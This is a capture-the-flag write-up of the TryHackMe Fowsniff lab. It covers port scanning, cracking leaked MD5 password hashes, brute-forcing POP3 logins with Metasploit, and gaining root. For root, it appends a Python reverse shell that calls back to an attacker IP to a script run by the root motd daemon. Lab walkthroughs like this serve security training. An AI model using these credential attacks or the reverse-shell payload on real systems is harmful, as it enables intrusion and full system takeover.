---
layout: post
title: "Fowsniff CTF"
date: 2022-10-20
categories: [Tryhackme, Easy-THM]
tags: [rustscan, twitter, pastebin, hashcat, metasploit, find]
image: ../../assets/img/posts/fowsniffctf.png 

---

## Description

Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!

|**Room**|[Fowsniff CTF](https://tryhackme.com/room/ctf)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[ben](https://tryhackme.com/p/ben)|

---

Starting off with deploying the machine and quickly scanning the open ports with rustscan,

```bash
rustscan -a 10.10.166.5 --ulimit 5000
```

![image](https://user-images.githubusercontent.com/67465230/186079580-761f081f-0e8c-47a3-a1d4-b227485ba9d3.png)

we got some open ports. Lets scan them in detail with nmap,

```bash
nmap -sC -sV -p22,80,110,143 10.10.166.5 -oN nmap.txt
```

![image](https://user-images.githubusercontent.com/67465230/186079625-9365f56d-4c15-475e-ba68-78696e28d9ac.png)

Result scan shows that port 22 is running ssh service, port 80 is running apache webserver, port 110 running is pop3 service, port 143 is running imap service. Let's start enumerating port 80.

Visit http://10.10.166.5,

![image](https://user-images.githubusercontent.com/67465230/186079692-c119c3d7-3598-4f68-8212-9d9f6ea88e07.png)

We landed on a webpage of Fowsniff corp. of which the website is temporarily out of service.

Scrolling down, there is a message from developers that Fowsniff Corp has suffered data breach, but, there is mention of fowsniff corp's twitter account,

![image](https://user-images.githubusercontent.com/67465230/186079746-4ba09c34-e89e-4816-87b5-62e6a9704b6e.png)

_Things might get interesting if I found something juice there._

Upon visiting the **@fowsniff** twitter account,

![image](https://user-images.githubusercontent.com/67465230/186079782-c8b843cf-4e06-4b90-8ea1-70311a766de4.png)

we got a post of pastebin.com which contain all dumped passwords.

Upon visiting mentioned link of pastebin.com, we got some account credentials, so I decided to look at the source code (_for tidyness reason_),

![image](https://user-images.githubusercontent.com/67465230/186079819-047c41b4-2b58-4de0-a3bb-cee1a508e3d2.png)

There is even mention of hashing algorithm that is deprecated, _MD5_.

With hashcat, we can crack the hashes,

```bash
hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt -O
```

![image](https://user-images.githubusercontent.com/67465230/186079848-9bff1afd-2173-4ef4-a4a5-541690483799.png)

all password hashes except one gets cracked. Copy all the username in users file and passwords in pass file.

Back into twitter window, scrolling till last, there is a sysadmin called stone which password hash has been dumped on post itself,

![image](https://user-images.githubusercontent.com/67465230/186079872-f89fca2e-892f-48b0-96d6-f8ad2b60f106.png)

Now that we have cracked the credentials, we now have to find the login credentials in order to mail service. We are going to utilize what's given service called POP3.

>Post Office Protocol version 3 (POP3) is an mail protocol used to retrieve mail from a remote server to a local email client. POP3 copies the mail from the remote server into the local mail client. Optionally, mail is deleted after it is downloaded from the server.

So we are going to use metasploit module,

```bash
msfconsole -q
search pop3 login
use auxiliary/scanner/pop3/pop3_login
options
```

![image](https://user-images.githubusercontent.com/67465230/186079926-c0b1b0e1-a417-4a7e-bddf-32c1817318a7.png)

setting `options`:
- **set rhosts 10.10.166.5**
- **set user_file users**
- **set pass_file pass**

Running the module and after sometime, we will get our credentials,

![image](https://user-images.githubusercontent.com/67465230/186079969-b3d233b3-a4a1-47df-9daa-0f15f0faa0bc.png)

Now, we can access the pop3 service using netcat,

```bash
nc 10.10.138.188 110
```

![image](https://user-images.githubusercontent.com/67465230/186080006-6ea4c799-7a98-4bea-a9b2-0cd69d81a5bc.png)

we get in after authentication.

We can take a look at cheatsheet of [POP3 commands](https://www.suburbancomputer.com/tips_email.htm)
We can list the messages using,

```bash
LIST
```

![image](https://user-images.githubusercontent.com/67465230/186080034-58b39156-3d02-49ba-b2a3-33d4d256dad3.png)

there are 2 messages. Let's take a look at them,

We can retrieve the mail message using,

```bash
RETR 1
```

![image](https://user-images.githubusercontent.com/67465230/186080083-6bd90192-d65a-4af5-ade9-2f06a909a72f.png)

looking at the mail which is sent by stone user and there is mention of temporary password of ssh service.

Using stone and temporary password to login via ssh, it fails. So I decided to look to next mail message,

```bash
RETR 2
```

![image](https://user-images.githubusercontent.com/67465230/186080115-e390454c-c709-4066-a2c5-376ee3ff9c1d.png)

looking at another mail, sender of this mail is baksteen user, _which might be very interesting to us_.

Now, trying to login via ssh,

```bash
ssh baksteen@10.10.138.188
```

![image](https://user-images.githubusercontent.com/67465230/186080144-40c0dc69-b422-4c14-95b4-28d9cf47a688.png)

we got in! From here we can get the user flag.

Now, given in the question, we gotta find cube.sh script,

```bash
find / -name cube.sh -type f 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/186080176-8486f701-0648-4382-a970-5d218f8c0e7c.png)

the path for the script is **/opt/cube/cube.sh**.

Let's take a look at script,

![image](https://user-images.githubusercontent.com/67465230/186080210-cf9cc89d-7077-4f91-96d9-40dac9ac2fdf.png)

Well this is the same banner we looked upon when we get logged in.

Well we can append python one-liner reverse shell in this script.

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.207",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![image](https://user-images.githubusercontent.com/67465230/186080245-ec31b60f-ebcf-490a-b023-6d15c8ec583e.png)

Now, we need to executables in "/etc/update-motd.d/" directory which might run this script,

![image](https://user-images.githubusercontent.com/67465230/186080299-bcb65ef4-aec5-4185-a2d4-5f0f1abd866d.png)

File **00-header** runs this shell script.

>The 00-header file composes the line describing the OS release by sourcing the /etc/lsb-release file and using what it finds to construct a message like this: Welcome to Ubuntu 17.04 (GNU/Linux 4.10.0-32-generic i686)

Viewing the content of 00-header file,

![image](https://user-images.githubusercontent.com/67465230/186080364-52ba7c25-fb77-47f2-9141-35501a0a660c.png)

we can confirm that it will run the cube.sh script. 

Now, start a netcat listener using `nc -nvlp 4444` and we will login back into ssh again,

```bash
ssh baksteen@10.10.90.6
```

![image](https://user-images.githubusercontent.com/67465230/186080401-1c2b0375-bb9c-4788-8107-ee28151ae099.png)

We got root!!

>Q. What happens here?
>A. Well, The motd (Message of the Day) daemon is responsible for displaying a message on an SSH connection and it is executed by root. So when our script is executed, so will our python reverse shell. Since we already have started netcat listener, the script will run as root, so we will get a system/root shell.